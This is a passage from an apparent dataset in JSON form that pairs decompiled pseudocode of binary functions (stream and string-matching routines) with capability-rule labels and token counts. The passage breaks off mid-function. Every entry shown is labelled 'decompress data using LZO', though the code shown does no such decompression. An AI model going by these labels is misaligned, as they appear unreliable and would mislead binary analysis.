*(*(arg_1ch + *piVar8 * 4) + var_20h);\n                        uVar5 = arg_ch;\n                        if (arg_8h != NULL) {\n                            if (arg_8h[2] < arg_8h[3]) {\n                                uVar5 = *arg_8h[2];\n                            }\n                            else {\n                                var_24h = piVar8;\n                                pcVar1 = *(*arg_8h + 0x24);\n                                puVar12 = piVar13 + -4;\n                                piVar13 = piVar13 + -4;\n                                *puVar12 = 0x478c5c;\n                                uVar5 = (*pcVar1)();\n                                piVar8 = var_24h;\n                                if (uVar5 == 0xffffffff) {\n                                    arg_8h = NULL;\n                                    uVar5 = 0xffffffff;\n                                }\n                            }\n                        }\n                        if (var_1ch != uVar5) break;\n                        piVar9 = piVar9 + 1;\n                        if (piVar16 <= piVar9) goto joined_r0x00478ace;\n                    }\n                    piVar16 = piVar16 + -1;\n                    *piVar8 = piVar11[piVar16];\n                } while (piVar9 < piVar16);\n                goto joined_r0x00478ace;\n            }\n            if (piVar16 == 0x1) {\n                piVar13[-1] = 0x478bbd;\n                fcn.004a5560();\n                uVar5 = var_20h;\n                arg_ch = 0xffffffff;\n                iVar4 = *(arg_1ch + *piVar11 * 4);\n                var_20h = *piVar11;\n                uVar5 = uVar5 + 1;\n                *piVar13 = iVar4;\n                piVar13[-1] = 0x478bdd;\n                var_1ch = sub.msvcrt.dll_strlen();\n                if (uVar5 < var_1ch) {\n                    do {\n                        arg_ch = 0xffffffff;\n                        *piVar13 = &fcn.004789f0::arg_10h;\n                        piVar13[-1] = 0x478bfe;\n                        cVar2 = fcn.004502d0();\n                        if (cVar2 != '\\0') goto code_r0x00478a3c;\n                        cVar2 = *(iVar4 + uVar5);\n                        piVar13[-2] = 0x478c18;\n                        cVar3 = fcn.004503c0();\n                        if (cVar2 != cVar3) goto code_r0x00478a3c;\n                        uVar5 = uVar5 + 1;\n                        piVar13[-2] = 0x478c2b;\n                        fcn.004a5560();\n                        piVar13 = piVar13 + -1;\n                    } while (uVar5 != var_1ch);\n                }\n                else if (uVar5 != var_1ch) goto code_r0x00478a3c;\n                arg_ch = 0xffffffff;\n                *arg_18h = var_20h;\n                goto code_r0x00478a42;\n            }\n        }\n    }\ncode_r0x00478a3c:\n    *arg_28h = *arg_28h | 4;\ncode_r0x00478a42:\n    return CONCAT44(arg_ch, arg_8h);\n}\n",
        "token_count": 2087
    },
    "00479f00": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Could not reconcile some variable overlaps\n\nulong __cdecl\nfcn.00479f00(int32_t *arg_8h, uint32_t arg_ch, int32_t *arg_10h, int32_t arg_14h, int32_t **arg_18h, int32_t arg_1ch, \n            int32_t *arg_20h, int32_t arg_24h, uint32_t *arg_28h)\n\n{\n    code *pcVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    char cVar4;\n    uint8_t uVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    int32_t *piVar8;\n    int32_t **ppiVar9;\n    int32_t **ppiVar10;\n    bool bVar11;\n    uint *puVar12;\n    uchar *puVar13;\n    uint *puVar15;\n    int32_t *piVar16;\n    uchar *puVar17;\n    uint *puVar18;\n    int32_t **ppiVar19;\n    int32_t **ppiVar20;\n    ulong uVar21;\n    uint uStack84;\n    int32_t aiStack80 [5];\n    uchar uStack57;\n    int32_t **var_34h;\n    int32_t **var_2dh;\n    int32_t **var_28h;\n    int32_t **var_24h;\n    int32_t **var_20h;\n    int32_t **var_1ch;\n    uint var_ch;\n    uint *puVar14;\n    \n    aiStack80[1] = arg_24h + 0x6c;\n    aiStack80[0] = 0x479f17;\n    var_24h = fcn.004c0160();\n    aiStack80[0] = 0x479f2f;\n    iVar6 = fcn.00437ed0();\n    iVar6 = -iVar6;\n    var_28h = &stack0xffffffc7 + iVar6 & 0xfffffff0;\n    *(&stack0xffffffb4 + iVar6) = &fcn.00479f00::arg_10h;\n    *(&stack0xffffffb0 + iVar6) = 0x479f49;\n    cVar4 = fcn.004502d0();\n    puVar13 = &stack0xffffffb0 + iVar6;\n    if (cVar4 == '\\0') {\n        ppiVar20 = NULL;\n        ppiVar10 = NULL;\n        *(&stack0xffffffac + iVar6) = 0x47a174;\n        uVar5 = fcn.004503c0();\n        iVar3 = arg_1ch;\n        var_1ch = var_1ch & 0xffffff00 | uVar5;\n        ppiVar19 = arg_20h * 2;\n        if (ppiVar19 == NULL) {\n            var_34h = NULL;\n            ppiVar20 = ppiVar19;\n        }\n        else {\n            var_20h = ppiVar19;\n            piVar8 = &stack0xffffffb0 + iVar6;\n            do {\n                while( true ) {\n                    cVar4 = **(iVar3 + ppiVar20 * 4);\n                    if (cVar4 != var_1ch) break;\ncode_r0x0047a1b8:\n                    var_28h[ppiVar10] = ppiVar20;\n                    ppiVar10 = ppiVar10 + 1;\n                    ppiVar20 = ppiVar20 + 1;\n                    puVar17 = piVar8;\n                    if (ppiVar20 == var_20h) goto code_r0x0047a1c9;\n                }\n                piVar2 = *var_24h;\n                *piVar8 = cVar4;\n                pcVar1 = piVar2[2];\n                piVar16 = piVar8 + -1;\n                piVar8[-1] = 0x47a19d;\n                cVar4 = (*pcVar1)();\n                piVar8 = piVar16 + -4;\n                puVar17 = piVar16 + -4;\n                if (var_1ch == cVar4) goto code_r0x0047a1b8;\n                ppiVar20 = ppiVar20 + 1;\n                piVar8 = piVar16 + -4;\n            } while (ppiVar20 != var_20h);\ncode_r0x0047a1c9:\n            if (ppiVar10 == NULL) {\n                var_34h = NULL;\n                puVar13 = puVar17;\n                ppiVar19 = ppiVar10;\n                ppiVar20 = NULL;\n            }\n            else {\n                *(puVar17 + -4) = 0x47a204;\n                fcn.004a5560();\n                arg_ch = 0xffffffff;\n                *(puVar17 + -4) = 0x47a220;\n                uVar21 = fcn.00437ed0();\n                iVar3 = arg_1ch;\n                iVar6 = -uVar21;\n                puVar13 = puVar17 + iVar6;\n                var_20h = ppiVar10;\n                var_1ch = (uVar21 >> 0x20) + var_28h;\n                var_34h = puVar17 + iVar6 + 0x13 & 0xfffffff0;\n                ppiVar19 = var_28h;\n                ppiVar20 = puVar17 + iVar6 + 0x13 & 0xfffffff0;\n                do {\n                    piVar8 = *ppiVar19;\n                    ppiVar19 = ppiVar19 + 1;\n                    *(puVar17 + iVar6) = *(iVar3 + piVar8 * 4);\n                    *(puVar17 + iVar6 + -4) = 0x47a253;\n                    piVar8 = sub.msvcrt.dll_strlen();\n                    *ppiVar20 = piVar8;\n                    ppiVar20 = ppiVar20 + 1;\n                } while (ppiVar19 != var_1ch);\n                ppiVar19 = var_20h;\n                ppiVar20 = 0x1;\n            }\n        }\n    }\n    else {\n        var_34h = NULL;\n        puVar13 = &stack0xffffffb0 + iVar6;\n        ppiVar19 = NULL;\n        ppiVar20 = NULL;\n    }\n    var_20h._0_1_ = arg_ch == 0xffffffff;\n    bVar11 = arg_8h != NULL && var_20h;\n    if (bVar11) goto code_r0x0047a06d;\n    while( true ) {\n        var_1ch._0_1_ = arg_14h == -1;\n        bVar11 = arg_10h != NULL && var_1ch;\n        var_1ch = var_1ch & 0xffffff00 | bVar11;\n        if ((bVar11) && (var_1ch._0_1_ = 0,  arg_10h[3] <= arg_10h[2])) {\n            var_20h = var_20h & 0xffffff00 | var_20h;\n            pcVar1 = *(*arg_10h + 0x24);\n            puVar14 = puVar13 + -4;\n            puVar13 = puVar13 + -4;\n            *puVar14 = 0x47a0c6;\n            iVar6 = (*pcVar1)();\n            if (iVar6 == -1) {\n                arg_10h = NULL;\n            }\n        }\n        if (var_20h == var_1ch) break;\n        uVar7 = arg_ch;\n        if ((arg_ch == 0xffffffff) && (arg_8h != NULL)) {\n            if (arg_8h[2] < arg_8h[3]) {\n                uVar7 = *arg_8h[2];\n                goto code_r0x00479fb5;\n            }\n            pcVar1 = *(*arg_8h + 0x24);\n            puVar18 = puVar13 + -4;\n            puVar13 = puVar13 + -4;\n            *puVar18 = 0x47a1e6;\n            uVar7 = (*pcVar1)();\n            if (uVar7 != 0xffffffff) goto code_r0x00479fb5;\n            arg_8h = NULL;\n            var_2dh._0_1_ = -1;\n        }\n        else {\ncode_r0x00479fb5:\n            var_2dh._0_1_ = uVar7;\n        }\n        if (ppiVar19 == NULL) goto code_r0x0047a123;\n        ppiVar10 = NULL;\n        var_1ch = ppiVar20;\n        stack0xffffffd0 = NULL;\n        var_20h = var_34h;\n        do {\n            while( true ) {\n                ppiVar9 = var_34h + ppiVar10;\n                if (ppiVar20 <= *ppiVar9 && *ppiVar9 != ppiVar20) break;\n                stack0xffffffd0 = stack0xffffffd0 + 1;\ncode_r0x00479fd9:\n                ppiVar10 = ppiVar10 + 1;\n                if (ppiVar19 <= ppiVar10) goto code_r0x0047a028;\n            }\n            var_24h = var_28h + ppiVar10;\n            if (*(*(arg_1ch + *var_24h * 4) + ppiVar20) == var_2dh) goto code_r0x00479fd9;\n            ppiVar19 = ppiVar19 + -1;\n            *var_24h = var_28h[ppiVar19];\n            *ppiVar9 = var_34h[ppiVar19];\n        } while (ppiVar10 < ppiVar19);\ncode_r0x0047a028:\n        if (stack0xffffffd0 == ppiVar19) break;\n        if (arg_8h[2] < arg_8h[3]) {\n            arg_8h[2] = arg_8h[2] + 1;\n        }\n        else {\n            pcVar1 = *(*arg_8h + 0x28);\n            puVar15 = puVar13 + -4;\n            puVar13 = puVar13 + -4;\n            *puVar15 = 0x47a105;\n            (*pcVar1)();\n        }\n        ppiVar20 = ppiVar20 + 1;\n        arg_ch = 0xffffffff;\n        bVar11 = arg_8h != NULL;\n        var_20h._0_1_ = 1;\n        if (bVar11) {\ncode_r0x0047a06d:\n            var_20h._0_1_ = 0;\n            if (arg_8h[3] <= arg_8h[2]) {\n                var_1ch = var_1ch & 0xffffff00;\n                pcVar1 = *(*arg_8h + 0x24);\n                puVar12 = puVar13 + -4;\n                puVar13 = puVar13 + -4;\n                *puVar12 = 0x47a083;\n                iVar6 = (*pcVar1)();\n                var_20h._0_1_ = var_1ch;\n                if (iVar6 == -1) {\n                    arg_8h = NULL;\n                    var_20h._0_1_ = bVar11;\n                }\n            }\n        }\n    }\n    if (ppiVar19 == 0x1) {\n        var_34h = *var_34h;\n    }\n    else {\n        if (ppiVar19 != 0x2) goto code_r0x0047a123;\n        if (*var_34h == ppiVar20) goto code_r0x0047a140;\n        var_34h = var_34h[1];\n    }\n    if (var_34h == ppiVar20) {\ncode_r0x0047a140:\n        piVar8 = *var_28h;\n        if (arg_20h <= piVar8) {\n            piVar8 = piVar8 - arg_20h;\n        }\n        *arg_18h = piVar8;\n        return CONCAT44(arg_ch, arg_8h);\n    }\ncode_r0x0047a123:\n    *arg_28h = *arg_28h | 4;\n    return CONCAT44(arg_ch, arg_8h);\n}\n",
        "token_count": 2792
    },
    "0047b4c0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint64_t __cdecl\nfcn.0047b4c0(int32_t *arg_8h, uint arg_ch, uint arg_10h, uint noname_3, int32_t *arg_18h, int32_t arg_1ch, \n            int32_t arg_20h, int32_t arg_24h, uint32_t *arg_28h)\n\n{\n    int16_t iVar1;\n    code *pcVar2;\n    char cVar3;\n    uint16_t uVar4;\n    uint16_t uVar5;\n    int16_t iVar6;\n    int16_t iVar7;\n    int32_t iVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    int32_t iVar11;\n    int32_t *piVar12;\n    int32_t *piVar13;\n    uint32_t *puVar14;\n    uint32_t *puVar15;\n    uint *puVar16;\n    int32_t *piVar17;\n    int32_t iVar19;\n    int32_t *piVar20;\n    uint uStack68;\n    int32_t aiStack64 [5];\n    int32_t *var_28h;\n    int32_t *var_24h;\n    int32_t *var_20h;\n    int32_t *var_1ch;\n    uint var_ch;\n    uint *puVar18;\n    \n    aiStack64[1] = arg_24h + 0x6c;\n    aiStack64[0] = 0x47b4d7;\n    var_1ch = fcn.004c01c0();\n    aiStack64[0] = 0x47b4ef;\n    iVar8 = fcn.00437ed0();\n    iVar8 = -iVar8;\n    *(&stack0xffffffc4 + iVar8) = &fcn.0047b4c0::arg_10h;\n    *(&stack0xffffffc0 + iVar8) = 0x47b506;\n    cVar3 = fcn.00450410();\n    iVar1 = arg_ch;\n    if (cVar3 == '\\0') {\n        *(&stack0xffffffbc + iVar8) = 0x47b52f;\n        uVar4 = fcn.004504b0();\n        if (arg_20h != 0) {\n            var_20h = &fcn.0047b4c0::var_28h + iVar8 + 3 & 0xfffffff0;\n            iVar19 = 0;\n            piVar20 = NULL;\n            iVar11 = arg_1ch;\n            puVar15 = &stack0xffffffc0 + iVar8;\n            do {\n                while (uVar5 = **(iVar11 + iVar19 * 4),  uVar5 == uVar4) {\ncode_r0x0047b572:\n                    var_20h[piVar20] = iVar19;\n                    piVar20 = piVar20 + 1;\n                    iVar19 = iVar19 + 1;\n                    piVar17 = puVar15;\n                    if (arg_20h == iVar19) goto code_r0x0047b583;\n                }\n                iVar8 = *var_1ch;\n                *puVar15 = uVar5;\n                pcVar2 = *(iVar8 + 0x18);\n                puVar14 = puVar15 + -1;\n                puVar15[-1] = 0x47b554;\n                arg_1ch = iVar11;\n                uVar5 = (*pcVar2)();\n                puVar15 = puVar14 + -4;\n                piVar17 = puVar14 + -4;\n                iVar11 = arg_1ch;\n                if (uVar4 == uVar5) goto code_r0x0047b572;\n                iVar19 = iVar19 + 1;\n                puVar15 = puVar14 + -4;\n            } while (arg_20h != iVar19);\ncode_r0x0047b583:\n            piVar12 = var_20h;\n            var_20h = NULL;\n            if (0x1 < piVar20) {\ncode_r0x0047b5a0:\n                iVar8 = *piVar12;\n                var_28h = piVar12;\n                *piVar17 = *(arg_1ch + iVar8 * 4);\n                piVar17[-1] = 0x47b5b3;\n                uVar9 = sub.msvcrt.dll_wcslen();\n                piVar12 = var_28h;\n                var_1ch = piVar20;\n                var_24h = iVar8;\n                piVar13 = 0x1;\n                do {\n                    *piVar17 = *(arg_1ch + piVar12[piVar13] * 4);\n                    piVar17[-1] = 0x47b5e1;\n                    uVar10 = sub.msvcrt.dll_wcslen();\n                    piVar20 = var_1ch;\n                    iVar8 = var_24h;\n                    if (uVar10 < uVar9) {\n                        uVar9 = uVar10;\n                    }\n                    piVar13 = piVar13 + 1;\n                } while (piVar13 < var_1ch);\n                if (arg_8h[2] < arg_8h[3]) {\n                    arg_8h[2] = arg_8h[2] + 2;\n                }\n                else {\n                    var_1ch = piVar12;\n                    pcVar2 = *(*arg_8h + 0x28);\n                    puVar18 = piVar17 + -1;\n                    piVar17 = piVar17 + -1;\n                    *puVar18 = 0x47b76a;\n                    (*pcVar2)();\n                    piVar12 = var_1ch;\n                }\n                var_20h = var_20h + 1;\n                var_24h = piVar12;\n                arg_ch._0_2_ = -1;\n                iVar1 = -1;\n                if (var_20h < uVar9) {\n                    *piVar17 = &fcn.0047b4c0::arg_10h;\n                    piVar17[-1] = 0x47b636;\n                    cVar3 = fcn.00450410();\n                    piVar17 = piVar17 + -1;\n                    iVar1 = -1;\n                    if (cVar3 == '\\0') {\n                        piVar13 = NULL;\n                        var_1ch = var_20h * 2;\n                        piVar12 = var_24h;\n                        do {\n                            iVar1 = *(*(arg_1ch + iVar8 * 4) + var_1ch);\n                            iVar7 = arg_ch;\n                            if (arg_8h != NULL) {\n                                if (arg_8h[2] < arg_8h[3]) {\n                                    iVar7 = *arg_8h[2];\n                                }\n                                else {\n                                    var_24h = piVar12;\n                                    pcVar2 = *(*arg_8h + 0x24);\n                                    puVar16 = piVar17 + -4;\n                                    piVar17 = piVar17 + -4;\n                                    *puVar16 = 0x47b75d;\n                                    iVar7 = (*pcVar2)();\n                                    piVar12 = var_24h;\n                                }\n                                if (iVar7 == -1) {\n                                    arg_8h = NULL;\n                                }\n                            }\n                            if (iVar1 == iVar7) {\n                                piVar13 = piVar13 + 1;\n                                if (piVar20 <= piVar13) goto code_r0x0047b68e;\n                            }\n                            else {\n                                piVar20 = piVar20 + -1;\n                                piVar12[piVar13] = piVar12[piVar20];\n                                if (piVar20 <= piVar13) goto code_r0x0047b68e;\n                            }\n                            iVar8 = piVar12[piVar13];\n                        } while( true );\n                    }\n                }\n                goto code_r0x0047b50d;\n            }\ncode_r0x0047b699:\n            iVar1 = arg_ch;\n            if (piVar20 == 0x1) {\n                piVar17[-1] = 0x47b6aa;\n                fcn.004a5ed0();\n                uVar9 = var_20h;\n                var_20h = *piVar12;\n                uVar9 = uVar9 + 1;\n                iVar8 = *(arg_1ch + *piVar12 * 4);\n                *piVar17 = iVar8;\n                piVar17[-1] = 0x47b6cc;\n                var_1ch = sub.msvcrt.dll_wcslen();\n                piVar20 = piVar17;\n                if (uVar9 < var_1ch) {\n                    do {\n                        *piVar20 = &fcn.0047b4c0::arg_10h;\n                        piVar20[-1] = 0x47b6e1;\n                        cVar3 = fcn.00450410();\n                        iVar1 = -1;\n                        if (cVar3 != '\\0') goto code_r0x0047b50d;\n                        iVar7 = *(iVar8 + uVar9 * 2);\n                        piVar20[-2] = 0x47b6fc;\n                        iVar6 = fcn.004504b0();\n                        iVar1 = -1;\n                        if (iVar7 != iVar6) goto code_r0x0047b50d;\n                        uVar9 = uVar9 + 1;\n                        piVar20[-2] = 0x47b710;\n                        fcn.004a5ed0();\n                        piVar20 = piVar20 + -1;\n                    } while (uVar9 < var_1ch);\n                }\n                iVar1 = -1;\n                if (var_1ch == uVar9) {\n                    *arg_18h = var_20h;\n                    goto code_r0x0047b513;\n                }\n            }\n        }\n    }\ncode_r0x0047b50d:\n    *arg_28h = *arg_28h | 4;\ncode_r0x0047b513:\n    return CONCAT24(iVar1, arg_8h);\ncode_r0x0047b68e:\n    if (piVar20 < 0x2) goto code_r0x0047b699;\n    goto code_r0x0047b5a0;\n}\n",
        "token_count": 2312
    },
    "0047cf00": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Could not reconcile some variable overlaps\n\nuint64_t __cdecl\nfcn.0047cf00(int32_t *arg_8h, uint arg_ch, int32_t *arg_10h, uint arg_14h, uint32_t *arg_18h, int32_t arg_1ch, \n            uint32_t arg_20h, int32_t arg_24h, uint32_t *arg_28h)\n\n{\n    uint16_t uVar1;\n    code *pcVar2;\n    uint uVar3;\n    char cVar4;\n    bool bVar5;\n    ushort uVar6;\n    int16_t iVar7;\n    int32_t *piVar8;\n    int32_t iVar9;\n    uint32_t uVar10;\n    int32_t iVar11;\n    uint *puVar12;\n    uint32_t *puVar13;\n    uint32_t *puVar14;\n    uchar *puVar15;\n    uchar *puVar16;\n    uint *puVar18;\n    uint *puVar19;\n    uint32_t uVar20;\n    uint32_t uVar21;\n    uint32_t *puVar22;\n    uint8_t uVar23;\n    ulong uVar24;\n    uint uStack84;\n    int32_t aiStack80 [5];\n    uchar uStack57;\n    int32_t var_34h;\n    uint32_t var_2eh;\n    uint32_t *var_28h;\n    uint32_t *var_24h;\n    uint32_t var_20h;\n    uint32_t *var_1ch;\n    uint var_ch;\n    uint *puVar17;\n    \n    aiStack80[1] = arg_24h + 0x6c;\n    aiStack80[0] = 0x47cf17;\n    piVar8 = fcn.004c01c0();\n    aiStack80[0] = 0x47cf2e;\n    iVar9 = fcn.00437ed0();\n    iVar9 = -iVar9;\n    var_24h = &stack0xffffffc7 + iVar9 & 0xfffffff0;\n    *(&stack0xffffffb4 + iVar9) = &fcn.0047cf00::arg_10h;\n    *(&stack0xffffffb0 + iVar9) = 0x47cf48;\n    cVar4 = fcn.00450410();\n    if (cVar4 == '\\0') {\n        uVar10 = 0;\n        uVar21 = 0;\n        *(&stack0xffffffac + iVar9) = 0x47d193;\n        uVar6 = fcn.004504b0();\n        var_1ch = CONCAT22(var_1ch._2_2_, uVar6);\n        uVar20 = arg_20h * 2;\n        var_20h = uVar20;\n        iVar11 = arg_1ch;\n        puVar14 = &stack0xffffffb0 + iVar9;\n        if (uVar20 == 0) {\n            puVar16 = &stack0xffffffb0 + iVar9;\n            puVar14 = NULL;\n        }\n        else {\n            do {\n                while( true ) {\n                    uVar1 = **(iVar11 + uVar10 * 4);\n                    if (uVar1 != var_1ch) break;\ncode_r0x0047d1dd:\n                    var_24h[uVar21] = uVar10;\n                    uVar21 = uVar21 + 1;\n                    uVar10 = uVar10 + 1;\n                    puVar15 = puVar14;\n                    uVar20 = uVar21;\n                    if (uVar10 == var_20h) goto code_r0x0047d1ee;\n                }\n                iVar9 = *piVar8;\n                *puVar14 = uVar1;\n                pcVar2 = *(iVar9 + 0x18);\n                puVar13 = puVar14 + -1;\n                puVar14[-1] = 0x47d1bd;\n                arg_1ch = iVar11;\n                iVar7 = (*pcVar2)();\n                puVar14 = puVar13 + -4;\n                puVar15 = puVar13 + -4;\n                iVar11 = arg_1ch;\n                if (var_1ch == iVar7) goto code_r0x0047d1dd;\n                uVar10 = uVar10 + 1;\n                puVar14 = puVar13 + -4;\n                uVar20 = uVar21;\n            } while (uVar10 != var_20h);\ncode_r0x0047d1ee:\n            var_20h = 0;\n            puVar16 = puVar15;\n            puVar14 = NULL;\n            if (uVar20 != 0) {\n                *(puVar15 + -4) = 0x47d207;\n                fcn.004a5ed0();\n                *(puVar15 + -4) = 0x47d225;\n                uVar24 = fcn.00437ed0();\n                iVar11 = arg_1ch;\n                iVar9 = -uVar24;\n                puVar16 = puVar15 + iVar9;\n                var_20h = uVar20;\n                var_28h = puVar15 + iVar9 + 0x13 & 0xfffffff0;\n                var_1ch = (uVar24 >> 0x20) + var_24h;\n                puVar14 = var_24h;\n                puVar22 = puVar15 + iVar9 + 0x13 & 0xfffffff0;\n                do {\n                    arg_ch = 0xffff;\n                    uVar20 = *puVar14;\n                    puVar14 = puVar14 + 1;\n                    *(puVar15 + iVar9) = *(iVar11 + uVar20 * 4);\n                    *(puVar15 + iVar9 + -4) = 0x47d256;\n                    uVar10 = sub.msvcrt.dll_wcslen();\n                    uVar20 = var_20h;\n                    *puVar22 = uVar10;\n                    puVar22 = puVar22 + 1;\n                } while (var_1ch != puVar14);\n                var_20h = 1;\n                puVar14 = var_28h;\n            }\n        }\n    }\n    else {\n        var_20h = 0;\n        uVar20 = 0;\n        puVar16 = &stack0xffffffb0 + iVar9;\n        puVar14 = NULL;\n    }\n    uVar23 = arg_ch == -1;\n    var_1ch._0_1_ = arg_8h != NULL && uVar23;\n    uVar3 = arg_ch;\n    if (var_1ch) goto code_r0x0047d083;\n    while( true ) {\n        arg_ch._0_2_ = uVar3;\n        var_1ch._0_1_ = arg_14h == -1;\n        bVar5 = arg_10h != NULL && var_1ch;\n        var_1ch = var_1ch & 0xffffff00 | bVar5;\n        if (bVar5) {\n            if (arg_10h[2] < arg_10h[3]) {\n                iVar7 = *arg_10h[2];\n            }\n            else {\n                pcVar2 = *(*arg_10h + 0x24);\n                puVar17 = puVar16 + -4;\n                puVar16 = puVar16 + -4;\n                *puVar17 = 0x47d278;\n                iVar7 = (*pcVar2)();\n            }\n            var_1ch._0_1_ = 0;\n            if (iVar7 == -1) {\n                arg_10h = NULL;\n            }\n        }\n        if (uVar23 == var_1ch) break;\n        var_2eh._0_2_ = arg_ch;\n        if ((arg_ch == -1) && (arg_8h != NULL)) {\n            if (arg_8h[2] < arg_8h[3]) {\n                var_2eh._0_2_ = *arg_8h[2];\n            }\n            else {\n                pcVar2 = *(*arg_8h + 0x24);\n                puVar19 = puVar16 + -4;\n                puVar16 = puVar16 + -4;\n                *puVar19 = 0x47d293;\n                var_2eh._0_2_ = (*pcVar2)();\n            }\n            if (var_2eh == -1) {\n                arg_8h = NULL;\n            }\n        }\n        if (uVar20 == 0) goto code_r0x0047d0fa;\n        uVar10 = 0;\n        var_1ch = puVar14;\n        puVar14 = var_1ch;\n        stack0xffffffd0 = 0;\n        var_34h = var_20h * 2;\n        do {\n            while( true ) {\n                puVar22 = puVar14 + uVar10;\n                if (var_20h <= *puVar22 && *puVar22 != var_20h) break;\n                stack0xffffffd0 = stack0xffffffd0 + 1;\ncode_r0x0047cfe7:\n                uVar10 = uVar10 + 1;\n                if (uVar20 <= uVar10) goto code_r0x0047d03a;\n            }\n            var_28h = var_24h + uVar10;\n            if (*(*(arg_1ch + *var_28h * 4) + var_20h * 2) == var_2eh) goto code_r0x0047cfe7;\n            uVar20 = uVar20 - 1;\n            *var_28h = var_24h[uVar20];\n            *puVar22 = puVar14[uVar20];\n        } while (uVar10 < uVar20);\ncode_r0x0047d03a:\n        if (stack0xffffffd0 == uVar20) break;\n        if (arg_8h[2] < arg_8h[3]) {\n            arg_8h[2] = arg_8h[2] + 2;\n        }\n        else {\n            pcVar2 = *(*arg_8h + 0x28);\n            puVar12 = puVar16 + -4;\n            puVar16 = puVar16 + -4;\n            *puVar12 = 0x47d145;\n            (*pcVar2)();\n        }\n        var_20h = var_20h + 1;\n        arg_ch = 0xffff;\n        var_1ch._0_1_ = arg_8h != NULL;\n        uVar23 = 1;\n        uVar3 = 0xffff;\n        if (var_1ch) {\ncode_r0x0047d083:\n            if (arg_8h[2] < arg_8h[3]) {\n                iVar7 = *arg_8h[2];\n            }\n            else {\n                var_1ch = var_1ch & 0xffffff00 | var_1ch;\n                pcVar2 = *(*arg_8h + 0x24);\n                puVar18 = puVar16 + -4;\n                puVar16 = puVar16 + -4;\n                *puVar18 = 0x47d285;\n                iVar7 = (*pcVar2)();\n            }\n            uVar23 = 0;\n            uVar3 = arg_ch;\n            if (iVar7 == -1) {\n                arg_8h = NULL;\n                uVar23 = var_1ch;\n            }\n        }\n    }\n    if (uVar20 == 1) {\n        uVar20 = *puVar14;\n    }\n    else {\n        if (uVar20 != 2) goto code_r0x0047d0fa;\n        if (*puVar14 == var_20h) goto code_r0x0047d15e;\n        uVar20 = puVar14[1];\n    }\n    if (uVar20 == var_20h) {\ncode_r0x0047d15e:\n        uVar20 = *var_24h;\n        if (arg_20h <= uVar20) {\n            uVar20 = uVar20 - arg_20h;\n        }\n        *arg_18h = uVar20;\n        return CONCAT24(arg_ch, arg_8h);\n    }\ncode_r0x0047d0fa:\n    *arg_28h = *arg_28h | 4;\n    return CONCAT44(uVar3, arg_8h);\n}\n",
        "token_count": 2790
    },
    "0047e690": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING (jumptable): Heritage AFTER dead removal. Example location: s0xffffffe0 : 0x0047e757\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Removing unreachable block (ram,0x0047ed5b)\n// WARNING: Removing unreachable block (ram,0x0047e7e7)\n// WARNING: Removing unreachable block (ram,0x0047e7ef)\n// WARNING: Removing unreachable block (ram,0x0047e806)\n// WARNING: Removing unreachable block (ram,0x0047e7c0)\n// WARNING: Removing unreachable block (ram,0x0047e811)\n// WARNING: Removing unreachable block (ram,0x0047e7c6)\n// WARNING: Removing unreachable block (ram,0x0047e7a3)\n// WARNING: Removing unreachable block (ram,0x0047e7ad)\n// WARNING: Removing unreachable block (ram,0x0047ebba)\n// WARNING: Removing unreachable block (ram,0x0047ec20)\n// WARNING: Removing unreachable block (ram,0x0047e7b3)\n// WARNING: Removing unreachable block (ram,0x0047e7d0)\n// WARNING: Removing unreachable block (ram,0x0047ed20)\n// WARNING: Removing unreachable block (ram,0x0047ed29)\n// WARNING: Removing unreachable block (ram,0x0047ef0c)\n// WARNING: Removing unreachable block (ram,0x0047ef20)\n// WARNING: Removing unreachable block (ram,0x0047edf0)\n// WARNING: Removing unreachable block (ram,0x0047ebbd)\n// WARNING: Removing unreachable block (ram,0x0047edff)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nulong __cdecl\nfcn.0047e690(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, int32_t arg_18h, uint32_t *arg_1ch, uint arg_20h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    int32_t iVar4;\n    ulong uVar5;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    int32_t var_3ch;\n    uint var_36h;\n    uint var_30h;\n    uint var_2ch;\n    int32_t var_27h;\n    int32_t var_20h;\n    uint var_1ch;\n    uint var_ch;\n    \n    iVar2 = arg_18h + 0x6c;\n    fcn.004c0160(iVar2);\n    iVar2 = fcn.0044dbe0(iVar2);\n    *NULL = fcn.0048b140(0, 0, &var_1ch);\n    if (*(iVar2 + 0x10) != '\\0') {\n        fcn.0048c930(0x20);\n    }\n    var_20h = fcn.0048b140(0, 0, &var_27h + 1);\n    fcn.0048c930(0x20);\n    var_3ch = 1;\n    var_1ch = *(iVar2 + 0x34);\n    puVar3 = &var_1ch;\n    while( true ) {\n        if (var_1ch < 5) {\n    // WARNING: Could not recover jumptable at 0x0047e77c. Too many branches\n    // WARNING: Treating indirect jump as call\n    // switch table (5 cases) at 0x5244e4\n            uVar5 = (**(*puVar3 * 4 + 0x5244e4))();\n            return uVar5;\n        }\n        if (3 < var_3ch) break;\n        puVar3 = &var_1ch + var_3ch;\n        var_1ch._0_1_ = *puVar3;\n        var_3ch = var_3ch + 1;\n    }\n    if ((1 < *(var_20h + -0xc)) && (iVar4 = fcn.0044bf30(0x30, 0),  iVar4 != 0)) {\n        if (iVar4 == -1) {\n            iVar4 = *(var_20h + -0xc) + -1;\n        }\n        fcn.0048b9a0(0, iVar4);\n    }\n    if (*(stack0xffffffd8 + -0xc) != 0) {\n        fcn.0048cc10(0);\n        cVar1 = fcn.004bdf60(*(iVar2 + 8), *(iVar2 + 